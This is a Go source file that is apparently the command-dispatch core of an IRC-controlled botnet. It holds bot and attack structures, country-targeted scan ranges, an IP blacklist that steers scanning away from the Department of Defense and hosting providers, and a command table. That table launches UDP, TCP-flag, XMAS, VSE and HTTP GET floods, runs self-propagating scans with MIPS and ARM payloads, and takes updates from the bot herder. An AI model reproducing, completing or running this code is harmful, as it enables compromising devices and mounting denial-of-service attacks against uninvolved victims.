package lib

import (
	"io"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var BotGroup, BotID string
var BotReader, server *string

type Bot struct {
	CPU                               int
	DEFAULT_ARCH, MIPS_ARCH, ARM_ARCH string
	password, network                 string
	Channel, ChanKey                  string
	BotTag, BotHerder                 string
	ScanOpt, scanOptFull              string
	tempIP                            string
	scanNetwork                       []string
	isRandom, scanSwitch              bool
	IRC                               net.Conn
	timeout                           time.Duration
	session                           *ssh.Client
}

type Attack struct {
	srcAddr, dstAddr, url                                      string
	dstPort                                                    string
	attackBody                                                 io.Reader
	flags                                                      string
	reportSwitch, attackSwitch                                 bool
	DDOS_PAYLOAD                                               []byte
	SYN_FLAG, ACK_FLAG, RST_FLAG, PSH_FLAG, FIN_FLAG, URG_FLAG bool
}

type Exploit struct {
	exploitName                                                     string
	exploitBody                                                     io.Reader
	exploitMethod, exploitPath                                      string
	exploitAgent, exploitAccept, exploitContType, exploitConnection string
}

type Caller struct {
	CallAttack *Attack
	CallBot    *Bot
}

var ScanMap = map[string]Bot{
	"-cn": {
		scanNetwork: China_Network,
		scanOptFull: "\"CHINA\"",
		isRandom:    false,
	},
	"-usa": {
		scanNetwork: USA_Network,
		scanOptFull: "\"U.S.A\"",
		isRandom:    false,
	},
	"-kr": {
		scanNetwork: Korea_Network,
		scanOptFull: "\"SOUTH KOREA\"",
		isRandom:    false,
	},
	"-br": {
		scanNetwork: Brazil_Network,
		scanOptFull: "\"BRAZIL\"",
		isRandom:    false,
	},
	"-r": {
		scanNetwork: Random_Network,
		scanOptFull: "\"RANDOM\"",
		isRandom:    true,
	},
}

var TCP_ATTACK_MAP = map[string]Attack{
	"-syn": {
		SYN_FLAG: true,
	},
	"-ack": {
		ACK_FLAG: true,
	},
	"-rst": {
		RST_FLAG: true,
	},
	"-psh": {
		PSH_FLAG: true,
	},
	"-fin": {
		FIN_FLAG: true,
	},
	"-urg": {
		URG_FLAG: true,
	},
}

/*
	Blacklist IPs that will be skipped in the random scanning process. Skip since first network ID.
	Some of these first network IDs may be anything not mentionally to be the thing that I have commented on,
	because I skip since the first network ID.
*/
var BlacklistIPs = map[string]struct{}{
	/*
		Loopback
	*/
	"127.": {},

	/*
		General Electric Company
	*/
	"3.": {},

	/*
		Hewlett-Packard Company
	*/
	"15.": {}, "16.": {},

	/*
		US Postal Service
	*/
	"56.": {},

	/*
		Internal network
	*/
	"10.": {}, "192.": {}, "172.": {},

	/*
		NAT
	*/
	"100.": {}, "169.": {},

	/*
		Special use
	*/
	"198.": {},

	/*
		Multicast
	*/
	"224.": {},

	/*
		Cloudflare
	*/
	"104.": {},

	/*
		Total Server Solutions
	*/
	"107.": {}, "184.": {}, "206.": {}, "98.": {},

	/*
		Blazingfast & Nforce
	*/
	"63.": {}, "70.": {}, "74.": {},

	/*
		Choopa & Vultr
	*/
	"64.": {}, "185.": {}, "208.": {}, "209.": {}, "45.": {}, "66.": {}, "108.": {}, "216.": {},

	/*
		Department of Defense
	*/
	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {}, "29.": {},
	"30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
}

func SetupCaller() (Caller, bool) {
	if Find(*BotReader, "?tcp") {
		var CALL_5_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					flags:        Recv(*BotReader, 4),
					srcAddr:      Recv(*BotReader, 5),
					dstAddr:      Recv(*BotReader, 6),
					dstPort:      Recv(*BotReader, 7),
					DDOS_PAYLOAD: sockBuffer(Recv(*BotReader, 8)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_5_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") || Find(*BotReader, "?scan") {
		var CALL_4_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					DDOS_PAYLOAD: sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?scan": {
				CallBot: &Bot{
					ScanOpt:      Recv(*BotReader, 4),
					DEFAULT_ARCH: Recv(*BotReader, 5),
					MIPS_ARCH:    Recv(*BotReader, 6),
					ARM_ARCH:     Recv(*BotReader, 7),
					scanSwitch:   false,
				},
			},
		}
		value, key := CALL_4_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?update") {
		var CALL_3_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?update": {
				CallBot: &Bot{
					DEFAULT_ARCH: Recv(*BotReader, 4),
					MIPS_ARCH:    Recv(*BotReader, 5),
					ARM_ARCH:     Recv(*BotReader, 6),
				},
			},
		}
		value, key := CALL_3_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") {
		var CALL_2_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_2_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?poling") || Find(*BotReader, "?jumbo") || Find(*BotReader, "?get") {
		var CALL_1_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallAttack: &Attack{
					url:          Recv(*BotReader, 4),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_1_ARG[SetupComd(3, ":")]
		return value, key
	} else if Find(*BotReader, "?info") || Find(*BotReader, "?kill") || Find(*BotReader, "?stopddos") || Find(*BotReader, "?stopscan") {
		var CALL_NON_ARG = map[string]Caller{
			SetupComd(3, ":"): {
				CallBot: &Bot{},
			},
			"?stopddos": {
				CallAttack: &Attack{
					attackSwitch: true,
					reportSwitch: true,
				},
			},
			"?stopscan": {
				CallBot: &Bot{
					scanSwitch: true,
				},
			},
		}
		value, key := CALL_NON_ARG[SetupComd(3, ":")]
		return value, key
	}
	return Caller{}, false
}

func (b *Bot) ExecuteCaller() (func(), bool) {
	var executesCallMap = map[string]func(){
		"?udp":      b.UDP,
		"?tcp":      b.TCP,
		"?saf":      b.SAF,
		"?xmas":     b.XMAS,
		"?vse":      b.VSE,
		"?fms":      b.FMS,
		"?ipsec":    b.IPSEC,
		"?poling":   b.POLING,
		"?jumbo":    b.JUMBO,
		"?get":      b.GET,
		"?scan":     b.scanner,
		"?update":   b.update,
		"?info":     b.information,
		"?kill":     KILL,
		"?stopddos": setAttackSwitch,
		"?stopscan": setScanSwitch,
	}
	value, key := executesCallMap[SetupComd(3, ":")]
	return value, key
}

func FunctionCaller(launch func()) { go launch() }
